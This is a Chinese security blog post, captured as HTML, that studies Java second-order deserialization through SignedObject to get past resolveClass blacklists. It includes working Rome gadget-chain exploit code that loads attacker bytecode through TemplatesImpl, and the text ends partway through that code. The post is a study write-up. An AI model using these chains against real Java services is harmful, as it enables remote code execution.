@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言之前学习c3p0的链子的时候在WrapperConnectionPoolDataSource这上面，浅浅接触了一下二次反序列化，遂系统的补充学习一下这个有意思的打法，在若干情况下直接反序列化会被重写的ObjectInputStream#resolveClass进行黑名单防御，而二次反序列化的类名不在黑名单中，遂实现绕过   SignedObject发现在java.security下有一个类，用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java二次反序列化学习">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言之前学习c3p0的链子的时候在WrapperConnectionPoolDataSource这上面，浅浅接触了一下二次反序列化，遂系统的补充学习一下这个有意思的打法，在若干情况下直接反序列化会被重写的ObjectInputStream#resolveClass进行黑名单防御，而二次反序列化的类名不在黑名单中，遂实现绕过   SignedObject发现在java.security下有一个类，用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251106162056292.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251106162110679.png">
+<meta property="article:published_time" content="2025-11-06T09:44:38.000Z">
+<meta property="article:modified_time" content="2025-11-25T16:18:05.220Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251106162056292.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java二次反序列化学习</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/ez-train/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/n1cat%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&text=Java二次反序列化学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java二次反序列化学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&is_video=false&description=Java二次反序列化学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java二次反序列化学习&body=Check out this article: https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java二次反序列化学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java二次反序列化学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java二次反序列化学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java二次反序列化学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&name=Java二次反序列化学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&t=Java二次反序列化学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SignedObject"><span class="toc-number">2.</span> <span class="toc-text">SignedObject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rome"><span class="toc-number">2.1.</span> <span class="toc-text">Rome</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">2.1.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ObjectBean"><span class="toc-number">2.1.2.</span> <span class="toc-text">ObjectBean</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EqualsBean"><span class="toc-number">2.1.3.</span> <span class="toc-text">EqualsBean</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#commons-beanutils"><span class="toc-number">2.2.</span> <span class="toc-text">commons-beanutils</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HotSwappableTargetSource-%E9%93%BE"><span class="toc-number">2.3.</span> <span class="toc-text">HotSwappableTargetSource 链</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E8%A1%A5"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">后补</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.3.1.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">2.4.</span> <span class="toc-text">后记</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMIConnector"><span class="toc-number">3.</span> <span class="toc-text">RMIConnector</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WrapperConnectionPoolDataSource"><span class="toc-number">4.</span> <span class="toc-text">WrapperConnectionPoolDataSource</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0"><span class="toc-number">5.</span> <span class="toc-text">参考学习</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java二次反序列化学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-06T09:44:38.000Z" class="dt-published" itemprop="datePublished">2025-11-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a> › <a class="category-link" href="/categories/Java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前学习c3p0的链子的时候在WrapperConnectionPoolDataSource这上面，浅浅接触了一下二次反序列化，遂系统的补充学习一下这个有意思的打法，在若干情况下直接反序列化会被重写的<code>ObjectInputStream#resolveClass</code>进行黑名单防御，而二次反序列化的类名不在黑名单中，遂实现绕过  </p>
+<h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>发现在java.security下有一个类，用于创建真实运行时的对象的类，在这个位置SignedObject#getObject方法     </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// creating a stream pipe-line, from b to a</span></span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="built_in">this</span>.content);</span><br><span class="line">    <span class="type">ObjectInput</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> a.readObject();</span><br><span class="line">    b.close();</span><br><span class="line">    a.close();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里有一个反序列化逻辑<br>跟下content值<br>于构造函数处控制，会将传入的对象进行序列化，再将字节数组存储到content中，再进行反序列化<br>这里有个小demo调试一下  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject = new SignedObject((Serializable)expMap, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));</span><br><span class="line">signedObject.getObject();</span><br></pre></td></tr></table></figure></div>
+<p>随便写了一个链子打，这里是成功了的<br>现在就是如何触发这个get方法，这里有几个利用链，稍微学习一下  </p>
+<h3 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+<p>借此机会，也学习一个Rome依赖的链子是个什么情况  </p>
+<h4 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h4><p>简述一下吧，这条链子的关键点在于ToStringBean#toString方法的被调用，会执行TemplateImpl类里的get方法，即<code>getOutputProperties</code>方法<br>此前的调用栈为<br>这边调一下，看值是如何包裹的，这里贴一下exp  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getpayload</span><span class="params">(Class clazz, Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;rand&quot;</span>));</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    hashMap.put(objectBean, <span class="string">&quot;rand&quot;</span>);</span><br><span class="line">    <span class="type">ObjectBean</span> <span class="variable">expObjectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(clazz, obj);</span><br><span class="line">    setFieldValue(objectBean, <span class="string">&quot;_equalsBean&quot;</span>, <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ObjectBean.class, expObjectBean));</span><br><span class="line">    <span class="keyword">return</span> hashMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>关注<code>_equalsBean</code>值<br>注意这里<code>return this._equalsBean.beanHashCode();</code>调用ObjectBean#hashcode&#x3D;&gt;EqualsBean#beanHashCode  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">beanHashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._obj.toString().hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>而这个_obj构造之初既是我们的<code>expObjectBean</code><br>调用它的toString方法即，再关注一下构造函数  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass, Object obj, Set ignoreProperties)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>._equalsBean = <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(beanClass, obj);</span><br><span class="line">    <span class="built_in">this</span>._toStringBean = <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(beanClass, obj);</span><br><span class="line">    <span class="built_in">this</span>._cloneableBean = <span class="keyword">new</span> <span class="title class_">CloneableBean</span>(obj, ignoreProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>此时obj已经是我们的Templates类了<br>最终走到  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(<span class="built_in">this</span>._obj, NO_PARAMS);</span><br><span class="line">                    <span class="built_in">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + pName, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span> + <span class="built_in">this</span>._obj.getClass() + <span class="string">&quot;.toString(): &quot;</span> + ex.getMessage() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里被调用<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251106162056292.png"><br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251106162110679.png"><br>这条链子还是比较简洁的，那么，我们还可以找到其他触发hashcode的方法代替HashMap吗？<br>更进一步，直接调用toString呢？之前学习过一些，比如CC5的<code>BadAttributeValueExpException</code>这里不赘述了<br>那么走到这里，我们可以直接反序列化打TemplateImpl类加载，但是既然二次反序列化，我们改为执行SignedObject的getObject方法，触发二次反序列化即可<br>exp  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two_unser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.example.test1.serialize;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.example.test1.unserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">                ClassPool.getDefault().get(com.example.Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] payloads= clazz.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;payloads&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> getpayload(Templates.class, obj);</span><br><span class="line"><span class="comment">//        serialize(hashMap1);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;payload&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> getpayload(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        serialize(hashMap2);</span><br><span class="line">        unserialize(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getpayload</span><span class="params">(Class clazz, Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;rand&quot;</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;rand&quot;</span>);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">expObjectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(clazz, obj);</span><br><span class="line">        setFieldValue(objectBean, <span class="string">&quot;_equalsBean&quot;</span>, <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ObjectBean.class, expObjectBean));</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span 